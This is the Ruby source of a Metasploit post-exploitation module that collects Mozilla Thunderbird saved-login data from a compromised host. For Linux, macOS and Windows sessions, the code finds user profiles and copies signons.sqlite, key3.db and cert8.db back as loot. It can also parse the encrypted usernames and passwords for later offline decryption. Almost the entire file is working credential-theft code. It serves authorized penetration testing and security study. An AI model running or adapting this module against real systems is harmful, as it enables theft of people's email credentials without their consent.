##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Gather Mozilla Thunderbird Signon Credential Collection',
        'Description' => %q{
          This module will collect credentials from Mozilla Thunderbird by downloading
          the necessary files such as 'signons.sqlite', 'key3.db', and 'cert8.db' for
          offline decryption with third party tools.

          If necessary, you may also set the PARSE option to true to parse the sqlite
          file, which contains sensitive information such as the encrypted username/password.
          However, this feature is not enabled by default, because it requires SQLITE3 gem
          to be installed on your machine.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sinn3r', # Metasploit
        ],
        'Platform' => %w[linux osx win],
        'SessionTypes' => ['meterpreter', 'shell'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_sys_config_getenv
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('PARSE', [false, 'Use SQLite3 to parse the database', false])
      ]
    )
  end

  def run
    # Initialize Thunderbird's base path based on the platform
    case session.platform
    when 'linux'
      user = session.shell_command('whoami').chomp
      base = "/home/#{user}/.thunderbird/"
    when 'osx'
      user = session.shell_command('whoami').chomp
      base = "/Users/#{user}/Library/Thunderbird/Profiles/"
    when 'windows'
      if session.type == 'meterpreter'
        user_profile = session.sys.config.getenv('APPDATA')
      else
        user_profile = cmd_exec('echo %APPDATA%').strip
      end
      base = user_profile + '\\Thunderbird\\Profiles\\'
    end

    # Now we have the path for Thunderbird, we still need to enumerate its
    # random profile names.
    print_status("Looking for profiles in #{base}...")
    profiles = get_profile_names(base)

    # Steal!
    profiles.each do |profile|
      next if profile =~ /^\./

      slash = (session.platform == 'windows') ? '\\' : '/'
      p = base + profile + slash

      # Download the database, and attempt to process the content
      download_loot(p)
    end
  end

  #
  # Download signons.sqlite and key3.db.
  # The routine will attempt to parse the sqlite db if the PARSE option is true,
  # and that SQLite3 is installed on the user's box.
  #
  def download_loot(path)
    # These are the files we wanna grab for the directory for future decryption
    files = ['signons.sqlite', 'key3.db', 'cert8.db']

    files.each do |item|
      loot = ''

      # Download the file
      # # @todo replace this with `Msf::Post::File.read_file`
      if session.type == 'meterpreter'
        vprint_status("Downloading: #{path + item}")
        begin
          f = session.fs.file.new(path + item, 'rb')
          loot << f.read until f.eof?
        rescue StandardError => e
          vprint_error(e.message)
        ensure
          f.close
        end
      elsif session.type == 'shell'
        cmd_show = (session.platform == 'windows') ? 'type' : 'cat'
        # The type command will add a 0x0a character in the file?  Pff.
        # Gotta lstrip that.
        loot = cmd_exec(cmd_show, "\"#{path + item}\"").lstrip
        next if loot =~ /system cannot find the file specified|No such file/
      end

      # Save it
      ext = ::File.extname(item)
      ext = ext[1, ext.length]

      loot_path = store_loot(
        "tb.#{item}",
        "binary/#{ext}",
        session,
        loot,
        "thunderbird_raw_#{item}",
        "Thunderbird Raw File #{item}"
      )

      print_status("#{item} saved in #{loot_path}")

      # Parse signons.sqlite
      next unless item =~ (/signons\.sqlite/) && datastore['PARSE']

      print_status('Parsing signons.sqlite...')
      data_tbl = parse(loot_path)
      if data_tbl.nil? || data_tbl.rows.empty?
        print_status('No data parsed')
        next
      end

      loot_path = store_loot(
        "tb.parsed.#{item}",
        'text/plain',
        session,
        data_tbl.to_csv,
        "thunderbird_parsed_#{item}",
        "Thunderbird Parsed File #{item}"
      )
      print_status("Parsed signons.sqlite saved in: #{loot_path}")
    end
  end

  #
  # Parse the sqlite database.
  # This thing requires sqlite3 gem, so we don't really recommend it.
  # The best way is to use railgun, but as of now we don't support that.
  # Can't just LoadLibrary("sqlite3.dll") or LoadLibrary("mozsqlite3.dll")
  #
  def parse(file)
    begin
      require 'sqlite3'
    rescue LoadError
      print_error("Sorry, SQLite3 not available. We'll have to skip the parser.")
      return nil
    end

    # Load the database
    db = SQLite3::Database.new(file)
    begin
      _, *rows = db.execute('select * from moz_logins')
    rescue StandardError => e
      print_error("doh! #{e}")
      return nil
    ensure
      db.close
    end

    # Create a rex table to store our data
    tbl = Rex::Text::Table.new(
      'Header' => 'Thunderbird login data',
      'Indent' => 1,
      'Columns' =>
        [
          'hostname',
          'httpRealm',
          'formSubmitURL',
          'usernameField',
          'passwordField',
          'encryptedUsername',
          'encryptedPassword',
          'guid'
        ]
    )

    # Parse the db, store the data
    rows.each do |row|
      tbl << [
        row[1],  # hostname
        row[2],  # httpRealm
        row[3],  # formSubmitURL (could be nil)
        row[4],  # usernameField
        row[5],  # passwordField
        row[6],  # encryptedUsername
        row[7],  # encryptedPassword
        row[8]   # guid
      ]
    end

    return tbl
  end

  #
  # Return the profile names based on a base path.
  # The format for the random profile name goes like: [random].default
  #
  def get_profile_names(path)
    tb_profiles = []

    if session.type == 'meterpreter'
      session.fs.dir.foreach(path) do |subdir|
        tb_profiles << subdir
      end
    else
      cmd = (session.platform == 'windows') ? "dir \"#{path}\"" : "ls -ld #{path}*/"
      dir = cmd_exec(cmd)
      dir.each_line do |line|
        line = line.strip
        next if session.platform == 'windows' && line !~ /<DIR>((.+)\.(\w+)$)/
        next if (session.platform == 'linux' || session.platform == 'osx') && line !~ /(\w+\.\w+)/

        tb_profiles << ::Regexp.last_match(1) if !::Regexp.last_match(1).nil?
      end
    end
    return tb_profiles
  end
end

=begin
If you're really curious about Mozilla's encryption/descryption API, download this:
ftp://ftp.mozilla.org/pub/mozilla.org/thunderbird/releases/8.0/source/

And then read the following files:
mozilla/security/manager/ssl/src/nsSDR.cpp
mozilla/security/nss/lib/pk11wrap/pk11sdr.c

Using a 3rd party decryptor is easier because Mozilla uses 2 different databases
(SQLite and Berkeley DB) to store the crypto information.  This makes proper decryption
implementation kind of uneasy, because railgun currently doesn't support SQLite3 and
BDB (require special handling -- it's not like you can do LoadLibrary('mozsqlite3.dll')
to load the lib).  Not to mention you need to borrow several more Mozilla components to
do the decryption.  BDB gem unfortunately is kind of busted during my testing, so I guess
we can pretty much forget about doing the decryption locally... chances are a lot of
users would have problems just to get that setup going anyway.
=end
